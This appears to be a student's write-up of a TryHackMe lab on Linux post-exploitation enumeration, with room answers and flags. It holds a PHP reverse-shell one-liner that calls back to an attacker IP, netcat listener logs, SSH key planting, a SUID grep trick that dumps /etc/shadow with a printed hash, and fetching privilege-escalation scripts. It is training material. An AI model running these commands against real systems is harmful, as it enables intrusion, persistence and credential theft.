---
Learn to efficiently enumerate a linux machine and identify possible weaknesses
---

![|333](https://tryhackme-images.s3.amazonaws.com/room-icons/d05746cfa7596f2f06697288060a143a.png)

###  Introduction 

Have you ever found yourself in a situation where you have no idea about "what to do after getting a reverse shell (access to a machine)"?
If your answer was "Yes", this room is definitely for you. This rooms aims at providing beginner basis in box enumeration, giving a detailed approach towards it.

Here's a list of units that are going to be covered in this room:
Unit 1 - Stabilizing the shell
	Exploring a way to transform a reverse shell into a stable bash or ssh shell.
Unit 2 - Basic enumaration
	Enumerate OS and the most common files to identify possible security flaws.
Unit 3 - /etc
	Understand the purpose and sensitivity of files under /etc directory.
Unit 4 - Important files
	Learn to find files, containing potentially valuable information.
Unit 6 - Enumeration scripts
	Automate the process by running multiple community-created enumeration scripts.

Browse to the MACHINE_IP:3000 and follow the instructions.
To continue with the room material, you need to get a reverse shell using a PHP payload and a netcat listener (nc -lvnp 1234).

How reverse shells work in a nutshell:

![](https://i.imgur.com/WlwnnqK.png)

```
Hello there!
This website is highly vulnerable to file upload and RCE. Use those to gain initial access to the box.

Method 1:
Browse to cmd.php and add the following php payload to the input field.
php -r '$sock=fsockopen("{IP}",{PORT}});exec("/bin/sh -i <&3 >&3 2>&3");'

Method 2:
Upload a reverse shell file below and execute it using the cmd.php 

fisrt listen 
rlwrap nc -nlvp 4444 

so go to ip:3000/cmd.php then input the payload

php -r '$sock=fsockopen("10.11.81.220",4444);exec("/bin/sh -i <&3 >&3 2>&3");'


yeah 

┌──(kali㉿kali)-[~]
└─$ rlwrap nc -nlvp 4444                                  
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.107.52.
Ncat: Connection from 10.10.107.52:44610.
/bin/sh: 0: can't access tty; job control turned off
$ whoami
manager



```

### Unit 1 - tty 


As you might have noticed, a netcat reverse shell is pretty useless and can be easily broken by simple mistakes.
In order to fix this, we need to get a 'normal' shell, aka tty (text terminal). 
Note: Mainly, we want to upgrade to tty because commands like su and sudo require a proper terminal to run.

One of the simplest methods for that would be to execute /bin/bash. In most cases, it's not that easy to do and it actually requires us to do some additional work.
Surprisingly enough, we can use python to execute /bin/bash and upgrade to tty:
python3 -c 'import pty; pty.spawn("/bin/bash")'

Generally speaking, you want to use an external tool to execute /bin/bash for you. While doing so, it is a good idea to try everything you know, starting from python, finishing with getting a binary on the target system. 
List of static binaries you can get on the system: github.com/andrew-d/static-binaries

Try experimenting with the netcat shell you obtained in the previous task and try different versions.
Read more about upgrading to TTY: blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys
Answer the questions below
How would you execute /bin/bash with perl?
Research! Maybe GTFOBins will give you an idea

*perl -e 'exec "/bin/bash";'*

```
┌──(kali㉿kali)-[~]
└─$ nc -nvlp 4444        
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.107.52.
Ncat: Connection from 10.10.107.52:44644.
/bin/sh: 0: can't access tty; job control turned off
$ perl -e 'exec "/bin/bash";'
whoami
manager
bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
manager@py:~/Desktop$  

```

### Unit 1 - ssh 

To make things even better, you should always try and get shell access to the box.

id_rsa file that contains a private key that can be used to connect to a box via ssh. It is usually located in the .ssh folder in the user's home folder. (Full path: /home/user/.ssh/id_rsa)
Get that file on your system and give it read/write-only permissions for your user:
(chmod 600 id_rsa) and connect by executing ssh -i id_rsa user@ip).

In case if the target box does not have a generated id_rsa file (or you simply don't have reading permissions for it), you can still gain stable ssh access. All you need to do is generate your own id_rsa key on your system and include an associated key into authorized_keys file on the target machine.
Execute ssh-keygen and you should see id_rsa and id_rsa.pub files appear in your own .ssh folder. Copy the content of the id_rsa.pub file and put it inside the authorized_keys file on the target machine (located in .ssh folder). After that, connect to the machine using your id_rsa file.

![](https://i.imgur.com/CZ6JRkW.jpg)



Where can you usually find the id_rsa file? (User = user)
*/home/user/.ssh/id_rsa*

```
manager@py:~/Desktop$ cd ..
cd ..
manager@py:~$ pwd
pwd
/home/manager
manager@py:~$ ls -lah
ls -lah
total 88K
drwxr-xr-x 16 manager manager 4.0K Oct 25  2020 .
drwxr-xr-x  3 root    root    4.0K Aug  4  2020 ..
-rw-------  1 manager manager  249 Oct 25  2020 .bash_history
-rw-r--r--  1 manager manager  220 Aug  4  2020 .bash_logout
-rw-r--r--  1 manager manager 3.7K Aug  4  2020 .bashrc
drwx------ 13 manager manager 4.0K Oct 25  2020 .cache
drwx------ 11 manager manager 4.0K Aug  4  2020 .config
drwxr-xr-x  2 manager manager 4.0K Aug  4  2020 Desktop
drwxr-xr-x  2 manager manager 4.0K Aug  4  2020 Documents
drwxr-xr-x  2 manager manager 4.0K Aug  4  2020 Downloads
drwx------  3 manager manager 4.0K Aug  4  2020 .gnupg
drwx------  3 manager manager 4.0K Aug  4  2020 .local
drwx------  5 manager manager 4.0K Aug  4  2020 .mozilla
drwxr-xr-x  2 manager manager 4.0K Aug  4  2020 Music
drwxr-xr-x  2 manager manager 4.0K Aug  4  2020 Pictures
-rw-r--r--  1 manager manager  807 Aug  4  2020 .profile
drwxr-xr-x  2 manager manager 4.0K Aug  4  2020 Public
-rw-r--r--  1 manager manager   66 Aug 24  2020 .selected_editor
drwx------  2 manager manager 4.0K Aug  4  2020 .ssh
-rw-r--r--  1 manager manager    0 Aug 24  2020 .sudo_as_admin_successful
drwxr-xr-x  2 manager manager 4.0K Aug  4  2020 Templates
drwxr-xr-x  2 manager manager 4.0K Aug  4  2020 Videos
-rw-------  1 manager manager  583 Oct 25  2020 .viminfo
manager@py:~$ cd .ssh
cd .ssh
manager@py:~/.ssh$ ls -la
ls -la
total 8
drwx------  2 manager manager 4096 Aug  4  2020 .
drwxr-xr-x 16 manager manager 4096 Oct 25  2020 ..
manager@py:~/.ssh$ 

```

Is there an id_rsa file on the box? (yay/nay)
*nay*

### Unit 2 - Basic enumeration 

Once you get on the box, it's crucially important to do the basic enumeration. In some cases, it can save you a lot of time and provide you a shortcut into escalating your privileges to root. 

> First, let's start with the uname command. uname prints information about the system. 

![](https://i.imgur.com/ZkWQu4Z.png)

Execute uname -a to print out all information about the system.
This simple box enumeration allows you to get initial information about the box, such as distro type and version. From this point you can easily look for known exploits and vulnerabilities.

> Next in our list are auto-generated bash files.
Bash keeps tracks of our actions by putting plaintext used commands into a history file. (~/.bash_history)
If you happen to have a reading permission on this file, you can easily enumerate system user's action and retrieve some sensitive infrmation. One of those would be plaintext passwords or privilege escalation methods. 

.bash_profile and .bashrc are files containing shell commands that are run when Bash is invoked. These files can contain some interesting start up setting that can potentially reveal us some infromation. For example a bash alias can be pointed towards an important file or process.

> Next thing that you want to check is the sudo version.
Sudo command is one of the most common targets in the privilage escalation. Its version can help you identify known exploits and vulnerabilities. Execute sudo -V to retrieve the version.
For example, sudo versions < 1.8.28 are vulnerable to CVE-2019-14287, which is a vulnerability that allows to gain root access with 1 simple command. 

> Last part of basic enumeration comes down to using our sudo rights.
Users can be assigned to use sudo via /etc/sudoers file. It's a fully customazible file that can either limit or open access to a wider range of permissions. Run sudo -l to check if a user on the box is allowed to use sudo with any command on the system. 

![](https://i.imgur.com/3y949OY.png)
Most of the commands open us an opportunity to escalate our priviligies via simple tricks described in GTFObins.

Note: Output on the picture demonstrates that user may run ALL commands on the system with sudo rights. A given configuration is the easiest way to get root. 

```
manager@py:~/.ssh$ cd /root
cd /root
bash: cd: /root: Permission denied
manager@py:~/.ssh$ uname -a
uname -a
Linux py 4.15.0-20-generic #21-Ubuntu SMP Tue Apr 24 06:16:15 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
manager@py:~/.ssh$ cd ..
cd ..
manager@py:~$ pwd
pwd
/home/manager
manager@py:~$ cd .bash_history
cd .bash_history
bash: cd: .bash_history: Not a directory
manager@py:~$ cat .bash_history
cat .bash_history
thm{clear_the_history}
id
sudo -l
clear
ls
cd /root
id
exit
clear
ls
ls -la
cat .bash_history 
clear
/usr/bin/vim.basic
/usr/bin/vim.basic -c ':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'
clear
ls
clear
sudo -l
sudo su
exit
manager@py:~$ pwd
pwd                                                                                   
/home/manager                                                                         
manager@py:~$ ls -lah                                                      
ls -lah                                                                  
total 88K                                                                
drwxr-xr-x 16 manager manager 4.0K Oct 25  2020 .                        
drwxr-xr-x  3 root    root    4.0K Aug  4  2020 ..                       
-rw-------  1 manager manager  249 Oct 25  2020 .bash_history            
-rw-r--r--  1 manager manager  220 Aug  4  2020 .bash_logout             
-rw-r--r--  1 manager manager 3.7K Aug  4  2020 .bashrc
drwx------ 13 manager manager 4.0K Oct 25  2020 .cache
drwx------ 11 manager manager 4.0K Aug  4  2020 .config
drwxr-xr-x  2 manager manager 4.0K Aug  4  2020 Desktop
drwxr-xr-x  2 manager manager 4.0K Aug  4  2020 Documents
drwxr-xr-x  2 manager manager 4.0K Aug  4  2020 Downloads
drwx------  3 manager manager 4.0K Aug  4  2020 .gnupg
drwx------  3 manager manager 4.0K Aug  4  2020 .local
drwx------  5 manager manager 4.0K Aug  4  2020 .mozilla
drwxr-xr-x  2 manager manager 4.0K Aug  4  2020 Music
drwxr-xr-x  2 manager manager 4.0K Aug  4  2020 Pictures
-rw-r--r--  1 manager manager  807 Aug  4  2020 .profile
drwxr-xr-x  2 manager manager 4.0K Aug  4  2020 Public
-rw-r--r--  1 manager manager   66 Aug 24  2020 .selected_editor
drwx------  2 manager manager 4.0K Aug  4  2020 .ssh
-rw-r--r--  1 manager manager    0 Aug 24  2020 .sudo_as_admin_successful
drwxr-xr-x  2 manager manager 4.0K Aug  4  2020 Templates
drwxr-xr-x  2 manager manager 4.0K Aug  4  2020 Videos
-rw-------  1 manager manager  583 Oct 25  2020 .viminfo
manager@py:~$ cat .bashrc
cat .bashrc
# ~/.bashrc: executed by bash(1) for non-login shells.
# see /usr/share/doc/bash/examples/startup-files (in the package bash-doc)
# for examples

# If not running interactively, don't do anything
case $- in
    *i*) ;;
      *) return;;
esac

# don't put duplicate lines or lines starting with space in the history.
# See bash(1) for more options
HISTCONTROL=ignoreboth

# append to the history file, don't overwrite it
shopt -s histappend

# for setting history length see HISTSIZE and HISTFILESIZE in bash(1)
HISTSIZE=1000
HISTFILESIZE=2000

# check the window size after each command and, if necessary,
# update the values of LINES and COLUMNS.
shopt -s checkwinsize

# If set, the pattern "**" used in a pathname expansion context will
# match all files and zero or more directories and subdirectories.
#shopt -s globstar

# make less more friendly for non-text input files, see lesspipe(1)
[ -x /usr/bin/lesspipe ] && eval "$(SHELL=/bin/sh lesspipe)"

# set variable identifying the chroot you work in (used in the prompt below)
if [ -z "${debian_chroot:-}" ] && [ -r /etc/debian_chroot ]; then
    debian_chroot=$(cat /etc/debian_chroot)
fi

# set a fancy prompt (non-color, unless we know we "want" color)
case "$TERM" in
    xterm-color|*-256color) color_prompt=yes;;
esac

# uncomment for a colored prompt, if the terminal has the capability; turned
# off by default to not distract the user: the focus in a terminal window
# should be on the output of commands, not on the prompt
#force_color_prompt=yes

if [ -n "$force_color_prompt" ]; then
    if [ -x /usr/bin/tput ] && tput setaf 1 >&/dev/null; then
        # We have color support; assume it's compliant with Ecma-48
        # (ISO/IEC-6429). (Lack of such support is extremely rare, and such
        # a case would tend to support setf rather than setaf.)
        color_prompt=yes
    else
        color_prompt=
    fi
fi

if [ "$color_prompt" = yes ]; then
    PS1='${debian_chroot:+($debian_chroot)}\[\033[01;32m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$ '
else
    PS1='${debian_chroot:+($debian_chroot)}\u@\h:\w\$ '
fi
unset color_prompt force_color_prompt

# If this is an xterm set the title to user@host:dir
case "$TERM" in
xterm*|rxvt*)
    PS1="\[\e]0;${debian_chroot:+($debian_chroot)}\u@\h: \w\a\]$PS1"
    ;;
*)
    ;;
esac

# enable color support of ls and also add handy aliases
if [ -x /usr/bin/dircolors ]; then
    test -r ~/.dircolors && eval "$(dircolors -b ~/.dircolors)" || eval "$(dircolors -b)"
    alias ls='ls --color=auto'
    #alias dir='dir --color=auto'
    #alias vdir='vdir --color=auto'

    alias grep='grep --color=auto'
    alias fgrep='fgrep --color=auto'
    alias egrep='egrep --color=auto'
fi

# colored GCC warnings and errors
#export GCC_COLORS='error=01;31:warning=01;35:note=01;36:caret=01;32:locus=01:quote=01'

# some more ls aliases
alias ll='ls -alF'
alias la='ls -A'
alias l='ls -CF'

# Add an "alert" alias for long running commands.  Use like so:
#   sleep 10; alert
alias alert='notify-send --urgency=low -i "$([ $? = 0 ] && echo terminal || echo error)" "$(history|tail -n1|sed -e '\''s/^\s*[0-9]\+\s*//;s/[;&|]\s*alert$//'\'')"'

# Alias definitions.
# You may want to put all your additions into a separate file like
# ~/.bash_aliases, instead of adding them here directly.
# See /usr/share/doc/bash-doc/examples in the bash-doc package.

if [ -f ~/.bash_aliases ]; then
    . ~/.bash_aliases
fi

# enable programmable completion features (you don't need to enable
# this, if it's already enabled in /etc/bash.bashrc and /etc/profile
# sources /etc/bash.bashrc).
if ! shopt -oq posix; then
  if [ -f /usr/share/bash-completion/bash_completion ]; then
    . /usr/share/bash-completion/bash_completion
  elif [ -f /etc/bash_completion ]; then
    . /etc/bash_completion
  fi
fi


manager@py:~$ sudo -V
sudo -V
Sudo version 1.8.21p2
Sudoers policy plugin version 1.8.21p2
Sudoers file grammar version 46
Sudoers I/O plugin version 1.8.21p2
manager@py:~$ sudo -l
sudo -l
[sudo] password for manager: manager

Sorry, try again.
[sudo] password for manager: 

Sorry, try again.
[sudo] password for manager: 

sudo: 3 incorrect password attempts



```

```
manager@py:~$ uname -m
uname -m
x86_64

```

How would you print machine hardware name only?
*uname -m*


Where can you find bash history?
https://www.gnu.org/savannah-checkouts/gnu/bash/manual/bash.html#Bash-History-Facilities
*~/.bash_history*



What's the flag?
*thm{clear_the_history}*

### Unit 3 - /etc 

Etc (etcetera) - unspecified additional items. Generally speaking, /etc folder is a central location for all your configuration files and it can be treated as a metaphorical nerve center of your Linux machine.

Each of the files located there has its own unique purpose that can be used to retrieve some sensitive information (such as passwords). The first thing you want to check is if you are able to read and write the files in /etc folder. Let's take a look at each file specifically and figure out the way you can use them for your enumeration process.

> /etc/passwd
This file stores the most essential information, required during the user login process. (It stores user account information). It's a plain-text file that contains a list of the system's accounts, giving for each account some useful information like user ID, group ID, home directory, shell, and more.

Read the /etc/passwd file by running cat /etc/passwd and let's take a closer look.

![](https://i.imgur.com/8vhblpQ.png)

Each line of this file represents a different account, created in the system. Each field is separated with a colon (:) and carries a separate value.

goldfish:x:1003:1003:,,,:/home/goldfish:/bin/bash

1. (goldfish) - Username
2. (x) - Password. (x character indicates that an encrypted account password is stored in /etc/shadow file and cannot be displayed in the plain text here)
3. (1003) - User ID (UID): Each non-root user has his own UID (1-99). UID 0 is reserved for root.
4. (1003) - Group ID (GID): Linux group ID
5. (,,,) - User ID Info: A field that contains additional info, such as phone number, name, and last name. (,,, in this case means that I did not input any additional info while creating the user)
6. (/home/goldfish) - Home directory: A path to user's home directory that contains all the files related to them.
7. (/bin/bash) - Shell or a command: Path of a command or shell that is used by the user. Simple users usually have /bin/bash as their shell, while services run on /usr/sbin/nologin. 

How can this help? Well, if you have at least reading access to this file, you can easily enumerate all existing users, services and other accounts on the system. This can open a lot of vectors for you and lead to the desired root. 

Otherwise, if you have writing access to the /etc/passwd, you can easily get root creating a custom entry with root priveleges. 
(For more info: hackingarticles.in/editing-etc-passwd-file-for-privilege-escalation)

> /etc/shadow
The /etc/shadow file stores actual password in an encrypted format (aka hashes) for user’s account with additional properties related to user password. Those encrypted passwords usually have a pretty similar structure, making it easy for us to identify the encoding format and crack the hash to get the password.

So, as you might have guessed, we can use /etc/shadow to retrieve different user passwords. In most of the situations, it is more than enough to have reading permissions on this file to escalate to root privileges. 
cat /etc/shadow

![](https://i.imgur.com/6DmDkRp.png)

```
goldfish:$6$1FiLdnFwTwNWAqYN$WAdBGfhpwSA4y5CHGO0F2eeJpfMJAMWf6MHg7pHGaHKmrkeYdVN7fD.AQ9nptLkN7JYvJyQrfMcfmCHK34S.a/:18483:0:99999:7:::

```

	1. (goldfish) - Username
	2. ($6$1FiLdnFwT...) - Password : Encrypted password.
	Basic structure: **$id$salt$hashed**, The $id is the algorithm used On GNU/Linux as follows:
- $1$ is MD5
- $2a$ is Blowfish
- $2y$ is Blowfish
- $5$ is SHA-256
- $6$ is SHA-512
3. (18483) - Last password change: Days since Jan 1, 1970 that password was last changed.
4. (0) - Minimum: The minimum number of days required between password changes (Zero means that the password can be changed immidiately).
5. (99999) - Maximum: The maximum number of days the password is valid.
6. (7) - Warn: The number of days before the user will be warned about changing their password.

What can we get from here? Well, if you have reading permissions for this file, we can crack the encrypted password using one of the cracking methods. 

Just like with /etc/passwd, writeable permission can allow us to add a new root user by making a custom entry.

> /etc/hosts
/etc/hosts is a simple text file that allows users to assign a hostname to a specific IP address. Generally speaking, a hostname is a name that is assigned to a certain device on a network. It helps to distinguish one device from another. The hostname for a computer on a home network may be anything the user wants, for example, DesktopPC or MyLaptop. 

You can try editing your own /etc/hosts file by adding the 10.10.107.52 there like so:
![](https://i.imgur.com/eGCyc19.png)
From now on you'll be able to refer to the box as box.thm.

Why do we need it? In real-world pentesting this file may reveal a local address of devices in the same network. It can help us to enumerate the network further.


Can you read /etc/passwd on the box? (yay/nay)
*yay*

### Unit 4 - Find command and interesting files 

Since it's physically impossible to browse the whole filesystem by hand, we'll be using the find command for this purpose.
I advise you to get familiar with the command in this room.

	The most important switches for us in our enumeration process are -type and -name.
	The first one allows us to limit the search towards files only -type f and the second one allows us to search for files by extensions using the wildcard (*). 

![](https://i.imgur.com/LE1vap1.png)

Basically, what you want to do is to look for interesting log (.log) and configuration files (.conf). In addition to that, the system owner might be keeping backup files (.bak).

Here's a list of file extensions you'd usually look for: [List](https://lauraliparulo.altervista.org/most-common-linux-file-extensions/). 

The following list shows the most commons file extensions for linux:

.a   : a static library ;
.au    : an audio file ;
.bin :    a) a binary image of a CD (usually a .cue file is also included); b) represents that the file is binary and is meant to be executed ;
.bz2 :    A file compressed using bzip2 ;
.c :    A C source file ;
.conf :  A configuration file. System-wide config files reside in /etc while any user-specific configuration will be somewhere in the user’s home directory ;
.cpp :  A C++ source file ;
.deb :  a Debian Package;
.diff :   A file containing instructions to apply a patch from a base version to another version of a single file or a project (such as the linux kernel);
.dsc:   a Debian Source information file ;
.ebuild : Bash script used to install programs through the portage system. Especially prevalent on Gentoo systems;
.el :  Emacs Lisp code file;
.elc :  Compiled Emacs Lisp code file;
.gif :    a graphical or image file;
.h :a C or C++ program language header file;
.html/.htm  :   an HTML file;
.iso :    A image (copy) of a CD-ROM or DVD in the ISO-9660 filesystem format;
.jpg :    a graphical or image file, such as a photo or artwork;
.ko :    The kernel module extension for the 2.6.x series kernel;
.la :    A file created by libtool to aide in using the library;
.lo :    The intermediate file of a library that is being compiled;
.lock :    A lock file that prevents the use of another file;
.log :    a system or program’s log file;
.m4 :    M4 macro code file;
.o :    1) The intermediate file of a program that is being compiled ; 2) The kernel module extension for a 2.4 series kernel ; 3)a program object file;
.pdf :    an electronic image of a document;
.php :     a PHP script;
.pid :    Some programs write their process ID into a file with this extention;
.pl :    a Perl script;
.png :    a graphical or image file;
.ps :    a PostScript file; formatted for printing;
.py :    a Python script;
.rpm :    an rpm package. See Distributions of Linux for a list of distributions that use rpms as a part of their package management system;
.s :    An assembly source code file;
.sh :    a shell script;
.so :     a Shared Object, which is a shared library. This is the equivalent form of a Windows DLL file;
.src  :    A source code file. Written in plain text, a source file must be compiled to be used;
.sfs :    Squashfs filesystem used in the SFS Technology;
.tar.bz2 , tbz2, tar.gz :     a compressed file per File Compression;
.tcl :    a TCL script;
.tgz :     a compressed file per File Compression. his may also denote a Slackware binary or source package;
.txt :    a plain ASCII text file;
.xbm :    an XWindows Bitmap image;
.xpm :     an image file;
.xcf.gz, xcf :  A GIMP image (native image format of the GIMP);
.xwd :    a screenshot or image of a window taken with xwd;
.zip :extension for files in ZIP format, a popular file compression format;
.wav :    an audio file.

```
manager@py:/$ find -type f -name "*.bak" 2>/dev/null
find -type f -name "*.bak" 2>/dev/null
./var/opt/passwords.bak
./var/backups/shadow.bak
./var/backups/passwd.bak
./var/backups/gshadow.bak
./var/backups/group.bak
manager@py:/$ cat ./var/opt/passwords.bak
cat ./var/opt/passwords.bak
THMSkidyPass

```

What's the password you found?
It's backed up
*THMSkidyPass*

```
manager@py:/$ find -type f -name "flag.conf" 2>/dev/null
find -type f -name "flag.conf" 2>/dev/null
./etc/sysconf/flag.conf
manager@py:/$ cat ./etc/sysconf/flag.conf
cat ./etc/sysconf/flag.conf
# Begin system conf 1.1.1.0
## Developed by Swafox and Chad

flag: thm{conf_file}

```


Did you find a flag?
.conf
*thm{conf_file}*

### Unit 4 - SUID 

Set User ID (SUID) is a type of permission that allows users to execute a file with the permissions of another user.
Those files which have SUID permissions run with higher privileges.  Assume we are accessing the target system as a non-root user and we found SUID bit enabled binaries, then those file/program/command can be run with root privileges. 

SUID abuse is a common privilege escalation technique that allows us to gain root access by executing a root-owned binary with SUID enabled.

You can find all SUID file by executing this simple find command:

	find / -perm -u=s -type f 2>/dev/null

-u=s searches files that are owned by the root user.
-type f search for files, not directories

After displaying all SUID files, compare them to a list on GTFObins to see if there's a way to abuse them to get root access. 

```
manager@py:/$ find / -perm -u=s -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
/bin/su
/bin/grep
/bin/ntfs-3g
/bin/mount
/bin/ping
/bin/umount
/bin/fusermount
/usr/bin/chsh
/usr/bin/arping
/usr/bin/sudo
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/traceroute6.iputils
/usr/bin/passwd
/usr/bin/pkexec
/usr/bin/newgrp
/usr/lib/snapd/snap-confine
/usr/lib/openssh/ssh-keysign
/usr/lib/xorg/Xorg.wrap
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/sbin/pppd
/snap/core/9665/bin/mount
/snap/core/9665/bin/ping
/snap/core/9665/bin/ping6
/snap/core/9665/bin/su
/snap/core/9665/bin/umount
/snap/core/9665/usr/bin/chfn
/snap/core/9665/usr/bin/chsh
/snap/core/9665/usr/bin/gpasswd
/snap/core/9665/usr/bin/newgrp
/snap/core/9665/usr/bin/passwd
/snap/core/9665/usr/bin/sudo
/snap/core/9665/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/9665/usr/lib/openssh/ssh-keysign
/snap/core/9665/usr/lib/snapd/snap-confine
/snap/core/9665/usr/sbin/pppd
/snap/core/4486/bin/mount
/snap/core/4486/bin/ping
/snap/core/4486/bin/ping6
/snap/core/4486/bin/su
/snap/core/4486/bin/umount
/snap/core/4486/usr/bin/chfn
/snap/core/4486/usr/bin/chsh
/snap/core/4486/usr/bin/gpasswd
/snap/core/4486/usr/bin/newgrp
/snap/core/4486/usr/bin/passwd
/snap/core/4486/usr/bin/sudo
/snap/core/4486/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/4486/usr/lib/openssh/ssh-keysign
/snap/core/4486/usr/lib/snapd/snap-confine
/snap/core/4486/usr/sbin/pppd

looking through gtofbins there's grep SUID
https://gtfobins.github.io/#+suid
```

Which SUID binary has a way to escalate your privileges on the box?
*grep*

```
manager@py:~/Desktop$ grep '' /etc/shadow
grep '' /etc/shadow
root:!:18362:0:99999:7:::
daemon:*:17647:0:99999:7:::
bin:*:17647:0:99999:7:::
sys:*:17647:0:99999:7:::
sync:*:17647:0:99999:7:::
games:*:17647:0:99999:7:::
man:*:17647:0:99999:7:::
lp:*:17647:0:99999:7:::
mail:*:17647:0:99999:7:::
news:*:17647:0:99999:7:::
uucp:*:17647:0:99999:7:::
proxy:*:17647:0:99999:7:::
www-data:*:17647:0:99999:7:::
backup:*:17647:0:99999:7:::
list:*:17647:0:99999:7:::
irc:*:17647:0:99999:7:::
gnats:*:17647:0:99999:7:::
nobody:*:17647:0:99999:7:::
systemd-network:*:17647:0:99999:7:::
systemd-resolve:*:17647:0:99999:7:::
syslog:*:17647:0:99999:7:::
messagebus:*:17647:0:99999:7:::
_apt:*:17647:0:99999:7:::
uuidd:*:17647:0:99999:7:::
avahi-autoipd:*:17647:0:99999:7:::
usbmux:*:17647:0:99999:7:::
dnsmasq:*:17647:0:99999:7:::
rtkit:*:17647:0:99999:7:::
speech-dispatcher:!:17647:0:99999:7:::
whoopsie:*:17647:0:99999:7:::
kernoops:*:17647:0:99999:7:::
saned:*:17647:0:99999:7:::
pulse:*:17647:0:99999:7:::
avahi:*:17647:0:99999:7:::
colord:*:17647:0:99999:7:::
hplip:*:17647:0:99999:7:::
geoclue:*:17647:0:99999:7:::
gnome-initial-setup:*:17647:0:99999:7:::
gdm:*:17647:0:99999:7:::
sshd:*:18362:0:99999:7:::
manager:$6$IL0a.UKt$nDPWg8EX0UKMZGJFITqSI48dmcnzww/5VgEnQHPlebWv6hoDWIg/D.qbdeewqnEYHdC.zcGduh3gG4aHb3A7m0:18478:0:99999:7:::

```

What's the payload you can use to read /etc/shadow with this SUID?
https://gtfobins.github.io/gtfobins/grep/#suid
*grep '' /etc/shadow*

### [Bonus] - Port Forwarding 

According to Wikipedia, "Port forwarding is an application of network address translation (NAT) that redirects a communication request from one address and port number combination to another while the packets are traversing a network gateway, such as a router or firewall". 

Port forwarding not only allows you to bypass firewalls but also gives you an opportunity to enumerate some local services and processes running on the box. 

The Linux netstat command gives you a bunch of information about your network connections, the ports that are in use, and the processes using them. In order to see all TCP connections, execute netstat -at | less. This will give you a list of running processes that use TCP. From this point, you can easily enumerate running processes and gain some valuable information.

netstat -tulpn will provide you a much nicer output with the most interesting data.

Read more about port forwarding here: fumenoid.github.io/posts/port-forwarding


Try using those commands on your system! 


### Unit 5 - Automating scripts 

Even though I, personally, dislike any automatic enumeration scripts, they are really important to the privilege escalation process as they help you to omit the 'human error' in your enum process. 

> Linpeas

LinPEAS - Linux local Privilege Escalation Awesome Script (.sh) is a script that searches for possible paths to escalate privileges on Linux/ hosts. 

![](https://camo.githubusercontent.com/7bbb832ba8a724e6ba26a0e433f9933e85930539/68747470733a2f2f61736369696e656d612e6f72672f612f3235303533322e706e67)


Linpeas automatically searches for passwords, SUID files and Sudo right abuse to hint you on your way towards root. 

They are different ways of getting the script on the box, but the most reliable one would be to first download the script on your system and then transfer it on the target.

![](https://i.imgur.com/yAfGFDW.png)
wget https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh

After that, you get a nice output with all the vulnerable parts marked.

> LinEnum

The second tool on our list is LinEnum. It performs 'Scripted Local Linux Enumeration & Privilege Escalation Checks' and appears to be a bit easier than linpeas.

You can get the script by running:

wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh

Now, as you have two tools on the box, try running both of them and see if either of them shows something interesting!
Please note: It's always a good idea to run multiple scripts separately and compare their output, as far as each one of them has their own specific scope of exploration.


Got it!

### Resources and what's next? 



Congratulations! You have successfully gone through Linux local enumeration!
Now you can understand the main concepts of manual and automatic enumeration which will lead you towards obtaining root!


We recommend you to continue your education by completing these awesome rooms, covering more in-depth privilege escalation:

1. https://tryhackme.com/room/sudovulnsbypass
2. https://tryhackme.com/room/commonlinuxprivesc
3. https://tryhackme.com/room/linuxprivesc


After doing so, you can practice your skills by completing these easy challenge machines:

1. https://tryhackme.com/room/vulnversity
2. https://tryhackme.com/room/basicpentestingjt
3. https://tryhackme.com/room/bolt
4. https://tryhackme.com/room/tartaraus


Read the above and consider completing mentioned rooms.

[[Python for Pentesters]]